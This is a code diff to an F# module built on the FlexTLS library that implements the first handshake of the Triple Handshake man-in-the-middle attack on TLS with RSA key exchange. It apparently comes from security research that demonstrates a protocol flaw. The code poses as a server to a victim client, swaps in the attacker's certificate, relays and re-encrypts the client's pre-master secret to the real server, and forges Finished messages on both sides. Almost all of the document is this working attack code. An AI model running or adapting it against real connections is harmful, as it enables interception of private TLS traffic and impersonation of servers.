@@ -7,29 +7,41 @@ open Error
 open TLSInfo
 open TLSConstants
 
-open FlexTLS.FlexTypes
-open FlexTLS.FlexConstants
-open FlexTLS.FlexHandshake
-open FlexTLS.FlexConnection
-open FlexTLS.FlexClientHello
-open FlexTLS.FlexServerHello
-open FlexTLS.FlexCertificate
-open FlexTLS.FlexServerHelloDone
-open FlexTLS.FlexClientKeyExchange
-open FlexTLS.FlexCCS
-open FlexTLS.FlexFinished
-open FlexTLS.FlexState
-open FlexTLS.FlexSecrets
+open NLog
 
+open FlexTLS
+open FlexTypes
+open FlexConstants
+open FlexHandshake
+open FlexConnection
+open FlexClientHello
+open FlexServerHello
+open FlexCertificate
+open FlexServerHelloDone
+open FlexClientKeyExchange
+open FlexCCS
+open FlexFinished
+open FlexState
+open FlexSecrets
+open FlexAlert
 
-
-
-//
-// WORK IN PROGRESS
-//
+// Some constant values
+let rsa_kex_css =
+    [ TLS_RSA_WITH_AES_256_GCM_SHA384;
+      TLS_RSA_WITH_AES_128_GCM_SHA256;
+      TLS_RSA_WITH_AES_256_CBC_SHA256;
+      TLS_RSA_WITH_AES_256_CBC_SHA;
+      TLS_RSA_WITH_AES_128_CBC_SHA256;
+      TLS_RSA_WITH_AES_128_CBC_SHA;
+      TLS_RSA_WITH_3DES_EDE_CBC_SHA;
+      TLS_RSA_WITH_RC4_128_MD5;
+      TLS_RSA_WITH_RC4_128_SHA;
+    ]
 
 type Attack_TripleHandshake =
     class
+
+    static member private logger = LogManager.GetCurrentClassLogger();
 
     static member runMITM (attacker_server_name:string, attacker_cn:string, attacker_port:int, server_name:string, ?port:int) : unit =
         let port = defaultArg port FlexConstants.defaultTCPPort in
@@ -46,71 +58,74 @@ type Attack_TripleHandshake =
         in
 
         // Start being a server
-        printf "Please connect to me, and I will attack you.\n";
         let sst,_ = FlexConnection.serverOpenTcpConnection(attacker_server_name,cn=attacker_cn,port=attacker_port) in
-        let sst,nsc,sch = FlexClientHello.receive(sst) in
+        let sst,snsc,sch = FlexClientHello.receive(sst) in
+
+        // Ensure the client proposes at least one RSA key exchange ciphersuite
+        match Handshake.negotiate sch.suites rsa_kex_css with
+        | None -> failwith "Triple Handshake demo only implemented for RSA key exchange"
+        | Some(rsa_kex_cs) -> 
 
         // Start being a client
-        let cst,_   = FlexConnection.clientOpenTcpConnection(server_name,cn=server_name,port=port) in
+        let cst,_ = FlexConnection.clientOpenTcpConnection(server_name,cn=server_name,port=port) in
         
-        // Override the honest client hello message with our preferences
-        // Access to the honest client random
-        let asch         = { sch with suites = [TLS_DHE_RSA_WITH_AES_128_GCM_SHA256]; ext = None; } in
-        let cst,nsc,cch = FlexClientHello.send(cst,asch) in
+        // Reuse the honest client hello message, but enforce an RSA kex ciphersuite
+        let cch = { sch with suites = [rsa_kex_cs] } in
+        let cst,cnsc,cch = FlexClientHello.send(cst,cch) in
 
-        // Forward server hello but check that the choosen ciphersuite is RSA
-        // Access to the honest server random
-        let cst,nsc,ssh   = FlexServerHello.receive(cst,asch,nsc) in
-        if not (TLSConstants.isRSACipherSuite (TLSConstants.cipherSuite_of_name ssh.suite)) then
-            failwith "Triple Handshake demo only implemented for RSA key exchange"
-        else
-        let sst,nsc,ssh   = FlexServerHello.send(sst,asch,nsc) in
+        // Forward server hello, and get access to the honest server random
+        let cst,cnsc,csh = FlexServerHello.receive(cst,cch,cnsc) in
+        let sst,snsc,ssh = FlexServerHello.send(sst,csh,snsc) in
 
-        // Discard the real certificate of the server and inject ours instead
-        let cst,cnsc,ccert = FlexCertificate.receive(cst,Client,nsc) in
-        let sst,snsc,scert = FlexCertificate.send(sst,Server,attacker_chain,nsc) in
+        // Discard the server certificate and inject ours instead
+        let cst,cnsc,ccert = FlexCertificate.receive(cst,Client,cnsc) in
+        let sst,snsc,scert = FlexCertificate.send(sst,Server,attacker_chain,snsc) in
 
         // Forward the server hello done
         let cst,sst,shdpayload  = FlexHandshake.forward(cst,sst) in
 
-        // Discard the real the client key exchange and inject ours instead
-        // Access to the PreMasterSecret
-        let sst,snsc,sfcke  = FlexClientKeyExchange.receiveRSA(sst,snsc,sch) in
-        let cst,cnsc,cfcke  = FlexClientKeyExchange.sendRSA(cst,cnsc,sch) in
+        // Get the PMS from the client ...
+        let sst,snsc,scke  = FlexClientKeyExchange.receiveRSA(sst,snsc,sch) in
+        // ... flow it into the other connection ...
+        let ckeys = {cnsc.keys with kex = snsc.keys.kex} in let cnsc = {cnsc with keys = ckeys} in
+        // ... and re-encrypt it to the server
+        let cst,cnsc,ccke  = FlexClientKeyExchange.sendRSA(cst,cnsc,cch) in
 
         // Forward the client CCS
         let sst,cst,_ = FlexCCS.forward(sst,cst) in
 
-        // Install the keys for the Real Client -> Real Server direction
-        let sst       = FlexState.installReadKeys sst snsc in
-        let cst       = FlexState.installWriteKeys cst cnsc in
+        // Install keys in one direction for each side of the MITM
+        let sst = FlexState.installReadKeys  sst snsc in
+        let cst = FlexState.installWriteKeys cst cnsc in
 
-        // Compute the log of the handshake
-        let slog      = sch.payload @| ssh.payload @| scert.payload @| shdpayload @| sfcke.payload in
-        let clog      = asch.payload @| ssh.payload @| ccert.payload @| shdpayload @| cfcke.payload in
+        // Compute the log of the handshake for each side of the MITM
+        let slog = sch.payload @| ssh.payload @| scert.payload @| shdpayload @| scke.payload in
+        let clog = cch.payload @| csh.payload @| ccert.payload @| shdpayload @| ccke.payload in
 
-        // Discard the real the finished message and inject ours instead
-        let sst,sff   = FlexFinished.receive(sst,logRoleNSC=(slog,Client,snsc)) in
-        let cst,cff   = FlexFinished.send(cst,logRoleNSC=(clog,Client,cnsc)) in
+        // Discard the client finished message and inject ours instead
+        let sst,sf = FlexFinished.receive(sst,logRoleNSC=(slog,Client,snsc)) in
+        let cst,cf = FlexFinished.send(cst,logRoleNSC=(clog,Client,cnsc)) in
 
         // Forward the server CCS
         let cst,sst,_ = FlexCCS.forward(cst,sst) in
 
-        // Install the keys for the Real Server -> Real Client direction
-        let cst       = FlexState.installReadKeys cst cnsc in
-        let sst       = FlexState.installWriteKeys sst snsc in
+        // Install the keys in the other direction for each side of the MITM
+        let cst = FlexState.installReadKeys cst cnsc in
+        let sst = FlexState.installWriteKeys sst snsc in
 
         // Compute the log of the handshake
-        let slog      = slog @| sff.payload in
-        let clog      = clog @| cff.payload in
+        let slog      = slog @| sf.payload in
+        let clog      = clog @| cf.payload in
 
-        // Discard the real the finished message and inject ours instead
-        let cst,cff   = FlexFinished.receive(sst,logRoleNSC=(clog,Server,cnsc)) in
-        let sst,sff   = FlexFinished.send(cst,logRoleNSC=(slog,Server,snsc)) in
+        // Discard the server finished message and inject ours instead
+        let cst,_   = FlexFinished.receive(cst,logRoleNSC=(clog,Server,cnsc)) in
+        let sst,_   = FlexFinished.send(sst,logRoleNSC=(slog,Server,snsc)) in
 
-        // End of the first handshake
-        Tcp.close cst.ns;
+        // Put a nice end to the first handshake
+        let sst = FlexAlert.send(sst,TLSError.AD_close_notify) in
         Tcp.close sst.ns;
+        let cst = FlexAlert.send(cst,TLSError.AD_close_notify) in
+        Tcp.close cst.ns;
         ()
 
     end
